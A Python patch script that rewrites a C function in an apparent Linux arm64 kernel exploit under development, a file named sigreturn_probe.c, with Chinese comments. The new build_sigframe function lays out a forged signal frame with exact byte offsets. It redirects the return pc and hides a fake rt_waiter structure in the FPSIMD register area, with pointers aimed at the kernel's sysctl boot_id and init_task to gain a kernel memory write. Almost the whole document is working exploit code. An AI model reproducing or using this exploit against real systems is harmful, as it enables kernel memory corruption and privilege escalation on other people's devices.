import io

p = r'C:\Users\QingJ\Desktop\root\work\qemu\sigreturn_probe.c'
src = io.open(p, encoding='utf-8').read()

# 找到 build_sigframe 函数并完全替换
start = src.find('static void build_sigframe(void)')
if start < 0:
    print('ERROR: build_sigframe not found')
    raise SystemExit(1)

# 找函数结束 (下一个 \n}\n)
end = src.find('\n}\n', start) + 3

new_func = r'''
static void build_sigframe(void){
  /* 全零初始化 */
  for(unsigned i=0;i<sizeof(sigframe_buf);i++) sigframe_buf[i]=0;

  /* 精确字节偏移 (从用户SP=0开始):
   * siginfo:      0x000 - 0x07F  (128B, 不读)
   * uc_flags:     0x080          (8B, 不读)
   * uc_link:      0x088          (8B, 不读)
   * uc_stack:     0x090 - 0x0A7  (24B, 不读)
   * uc_sigmask:   0x0A8 - 0x127  (128B → set_current_blocked)
   * __unused:     0x128 - 0x1A7  (128B)
   * fault_addr:   0x1A8          (8B)
   * regs[31]:     0x1B0 - 0x2A7  (248B)
   * sp:           0x2A8          (8B)
   * pc:           0x2B0          (8B) ← sigreturn跳转目标!
   * pstate:       0x2B8          (8B)
   * __reserved:   0x2C0 - 0x11BF (4096B)
   *   __reserved+0x00: FPSIMD magic = 0x46508001 (u32)
   *   __reserved+0x04: size = 0x210 (u32)
   *   __reserved+0x08: fpsr(u32) fpcr(u32)
   *   __reserved+0x10: vregs[512B] ← fake waiter 数据!
   *   __reserved+0x220: terminator {0,0} (已由全零保证)
   */

  /* 设置 pc → 死循环 */
  unsigned long target_pc = (unsigned long)&after_sigreturn_loop;
  for(int i=0;i<8;i++) sigframe_buf[0x2B0+i] = ((unsigned char*)&target_pc)[i];

  /* 设置 pstate = 0 (EL0t 合法) — 已由全零保证 */

  /* __reserved 起始于 sigframe_buf + 0x2C0 */
  unsigned char *res = sigframe_buf + 0x2C0;

  /* FPSIMD context header */
  unsigned int magic = 0x46508001;
  unsigned int ctxsz = 0x210;
  for(int i=0;i<4;i++) res[i]     = ((unsigned char*)&magic)[i];
  for(int i=0;i<4;i++) res[4+i]   = ((unsigned char*)&ctxsz)[i];
  /* fpsr/fpcr 已零 */

  /* vregs 从 reserved+0x10 开始 (512B): 填 fake rt_waiter */
  unsigned char *v = res + 0x10;
  unsigned long parent = SCRATCH + 0x108;
  unsigned long lockval = SCRATCH;
  unsigned long bootid_va = SYSCTL_BOOTID;
  unsigned long init_task_va = INIT_TASK;

  /* tree_entry: pc@+0, right@+8, left@+16 */
  for(int i=0;i<8;i++) v[0+i]  = ((unsigned char*)&parent)[i];      /* w0: tree.pc = 写值 */
  for(int i=0;i<8;i++) v[8+i]  = 0;                                  /* w1: tree.right */
  for(int i=0;i<8;i++) v[16+i] = ((unsigned char*)&bootid_va)[i];   /* w2: tree.left = 写入目标 */

  /* pi_tree: pc@+24, right@+32, left@+40 */
  for(int i=0;i<8;i++) v[24+i] = ((unsigned char*)&parent)[i];      /* w3: pi.pc */
  for(int i=0;i<8;i++) v[32+i] = 0;                                  /* w4: pi.right */
  for(int i=0;i<8;i++) v[40+i] = ((unsigned char*)&bootid_va)[i];   /* w5: pi.left */

  /* task@+48, lock@+56, prio@+64 */
  for(int i=0;i<8;i++) v[48+i] = ((unsigned char*)&init_task_va)[i]; /* w6: task */
  for(int i=0;i<8;i++) v[56+i] = ((unsigned char*)&lockval)[i];      /* w7: lock */
  unsigned long prio = 3;
  for(int i=0;i<8;i++) v[64+i] = ((unsigned char*)&prio)[i];         /* w8: prio */
}
'''

src = src[:start] + new_func + src[end:]

# 也修正 pc/sp 的偏移引用 (在 waiter_fn 里设置 sigframe 后的 memcpy)
old_pc = '__builtin_memcpy(sigframe_buf + 0x128 + 0x108, &target_pc, 8);'
new_pc = '__builtin_memcpy(sigframe_buf + 0x2B0, &target_pc, 8);'
src = src.replace(old_pc, new_pc)

old_sp = '__builtin_memcpy(sigframe_buf + 0x128 + 0x100, &new_sp, 8);'
new_sp = '__builtin_memcpy(sigframe_buf + 0x2A8, &new_sp, 8);'
src = src.replace(old_sp, new_sp)

io.open(p, 'w', encoding='utf-8').write(src)
print('build_sigframe rewritten with exact byte offsets')
